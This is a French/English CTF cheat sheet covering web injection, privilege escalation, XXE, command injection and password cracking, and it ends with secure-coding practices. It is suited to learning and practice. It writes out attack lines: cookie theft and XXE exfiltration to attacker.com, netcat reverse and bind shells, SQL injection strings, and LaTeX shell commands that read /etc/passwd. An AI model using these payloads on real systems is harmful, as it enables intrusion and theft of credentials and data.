# CTF Toolbox


### ENcode/DEcode tools

* [https://www.urlencoder.org/](URL Encoder)
* [https://www.md5online.org/md5-decrypt.html](MD5 decoder)
* [https://www.jsonwebtoken.io/](JWT decoder)

### General resources

* [https://owasp.org](OWASP) Testing Guide : Open Web Application Security Project.
* [https://portswigger.net/blog/server-side-template-injection](portswigger.net) Tests de moteurs de templates
* [https://exploit-db.com](exploit-db.com) Vulnérabilités connues


## Passwords

### Resources

* [https://github.com/zxcvbn-ts](zxcvbn) Low-Budget Password Strength Estimation
* [https://haveibeenpwned.com](haveibeenpwned.com) Tester la compromission de son adresse mail


## Privilege Escalation

*Goals:* Attention aux chemins avec espaces non entourés de quotes concernant les services exécutés en tant que SYSTEM. 

Détection des services concernés:
```bash
# 
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```

Vérifier les droits décriture sur les dossiers parents:
```bash
icacls "C:\Program Files (x86)\Common Files"
# vulnérabilité présente si utilisateur BUILTIN\Users:(W)
```


### Sensitive files to inspect

```bash
cat /var/log/apache2
cat /var/log/auth.log
cat /proc/self/environ (environnement envoyé par les requetes HTTP par ex) ; fd (open files)
```




### Resources

* [https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae](medium.com) Windows Privileges Escalation






## Website hacking

### Javascript injections

*Goals:* Injection de javascript/HTML via formulaire HTML ou URL, Vol de session administrateur / tierce

```javascript
// Basic testing
<script type="text/javascript">alert('test')</script>
```

### SQL Injections

*Goals:* Récupérations d'informations sensibles de la base de données

Basic Login hacking:
```sql
-- test 1
' OR 1=1; -- -
--  test 2
1' || 1=1 # -
-- test 3
... ORDER BY 1, 2, 3, 4, 5, 6, ... 10, 15
```

Extract data to file and read it:
```sql
SELECT ... INTO OUTFILE ;
SELECT LOAD_FILE ...;
information_schema.schemata, information_schema.columns, ...
VERSION(), USER()
```


### Cross-Site Request Forgery (CSRF)

*Goals:* Récupérer la session d'un site externe via envoi d'un formulaire non HTTPS

```html
document.write('<img src="http://attacker.com:8080/cookie?' + document.cookie + '"/>');
<form action="..."><input type="hidden"/>...</form><script>document.forms[0].submit();</script>

```

### Server-Side Request Forgery (SSRF)

*Goals:* Utilisation d'un formulaire d'envoi d'image pour scanner le serveur

Outil: BurpSuite + Intruder:
```bash
http://ip.locale:port
```

### File Injection

*Goals:* Utiliser la fonction d'import de fichier pour injecter du code interprétable.
```bash
# 1. Code PHP en fin de fichier PNG
# 2. Bulletproof JPEGs (code php présent même après réduction de l'image)
# 3. 
curl --user-agent='<?php phpinfo();?>'
```


### JWT tools

hashcat, jwtbrute : permet de casser des clés JWT (360 millions/sec):
```bash
hashcat -m 16500 hash.txt -a 3 -w 3 ?a?a?a?a?a?a
```

### Resources

* [https://archive.org/web/](archive.org) view old versions of web pages
* [https://www.jsonwebtoken.io/](JWT decoder)




## XML Injections

*Goals:* 

Billion Laughs: Inclusion exponentielle d'entités XML
```xml
<!ENTITY lol "lol"> <!ENTITY lol2 "&lol; &lol;">
```

Lire des fichiers sur le serveur
```bash
<!ENTITY faille SYSTEM "file:///etc/passwd"> <!ENTITY attacker SYSTEM "https://attacker.com?%faille;">
<data>&faille;</data>
```




## Remote server injections

### Command Injections

*Goals:* Accès à distance sur le serveur. Màj de fichiers. Accès root. déni de service...

BindShell:
```bash
# Open a shell from a remote machine
nc -lp 1234 -e /bin/sh
# from local machine
nc <ip_victime> 1234
```

ReverseShell:
```bash
# From local machine
nc -lvp 1234
# From remove machine
nc <ip_attaquant> 1234 /bin/sh
```

InteractiveShell:
```bash
python -c 'import pty; pty.spawn("/bin/bash");'
```

Injection Code:
```
{cat,/etc/passwd}
```

Make a quick http server:
```bash
python -m SimpleHttpServer 8080 ; php -S 8080
```


## Code vulnerabilities

### PHP Injection

*Goals:* Extract PHP data from a form or a posted image

```php
var_dump(serialize($obj));
```

### LaTeX Injection

*Goals:* Les documents LaTex peuvent contenir des commandes système

```bash
\immediate\write18{cat /etc/passwd | base64 > /tmp/ouned.tex}
# pour sécuriser: option -no-shell-escape [https://0day.work/hacking-with-latex](hacking-with-latex) ; [https://linux.die.net/man/1/pdflatex](pdflatex)
```

### Resources

* [https://ripstech.com](ripstech.com) Validation sécurité PHP


## Steganography

### Resources

* [https://virtualabs.fr/Nasty-bulletproof-Jpegs-l](virtualabs.fr) Bulletproof JPEGs
* [https://stylesuxx.github.io/steganography/](stylesuxx)



## Cipher

*Goals:* Attaque possible par bourrage si couple PKCS7/CBC (Cipher Block Chaining) utilisé.



## To go further

### Kali Linux Tools

```bash
# kali linux : sqlmap
# sqlmap --url="" --forms -v3 --cookie="" --threads=2 (cookie=document.cookie dans le navigateur)
# Recherche les failles dans les formulaires HTML
# Méthode time_based: SLEEP ou BENCHMARK pour détecter si le code est exécuté
# Méthode bool_based: AND x between 'a' and 'm' : recherche dichotomique sur le champ recherché

# kali linux: beEF Xss framework

# kali linux: BuRP
# Plugin Authorize: Teste sur chaque requête le mode authentifié / non authentifié / admin

# kali linux: Intruder: 
# Rejouer les requêtes paramétrées pour scanner un réseau par exemple.
# proxy local pas-à-pas HTTP. Headers modifiables. Rejouable dans Intruder
```


### Material tools

* Clé TNT modifiée permettant d'écouter le réseau GSM par exemple (illégal. NooElec, env. 20€)
* Fournisseur téléphonique (SFR/Free/... illégal. BladeRF, nuand.com, env. 500€)
* Brutalis : 8 GPU casseur de mdp: env. 250 milliards de md5 par seconde. sagitta.pw


### Library

Social Engineering:

* Silence on the Wire - Michal Zalewski
* Hacking, the Art Of Exploitation - Jon Erickson

### Glossary

* Vulnérabilité: Erreur de conception. Elle peut être logique (scénario mal conçu) ou technique (pb de sécurité, ...)
* Menace: Element (naruel, humain, technique) exploitant une vulnérabilité
* Exploit: Scénario décrivant l'exploitation d'une vulnérabilité

### Good practices

* Ne pas stocker les mdp en clair en base de données
* Implémenter la sécurité dès le début de la conception ; la vérifier
* Authentification user/mdp : facile mais prévoir garde-fous (logs, en clair le moins d'endroits possibles)
* Perte mot de passe : pas de mdp en clair par mail, ne pas remplacer le mdp existant dès la demande effectuée
* Authentification OTP (One Time Password) : Mdp + clé générée. Nécessite un périphérique (téléphone, jeton, ...)
* Messages d'erreurs : fournir le moins d'informations possibles. Une erreur générique suffit pour ne pas distinguer les différents cas d'erreurs
* Une session doit périmée, interrompue, sécurisée (flag cookie secure envoyé que sur HTTPS ou httpOnly pour ne pas être utilisé par javascript), être détruite côté serveur à la déconnexion
* Token JWT : ne pas autoriser l'algorithme "none" (pas de signature). Avoir un "secret" robuste
* SQL: utiliser des frameworks (ORM), prepared statements, ...
* Formulaires HTML : créer des tokens (jeton CSRF) pour authentifier le formulaire
* Pas d'infos sensibles dans les logs
* Clé symétrique : minimum 128 bits. Clé asymétrique : minimum 2048 bits. Entropie : utiliser Crypt RNG pour l'aléatoire. Une clé par application
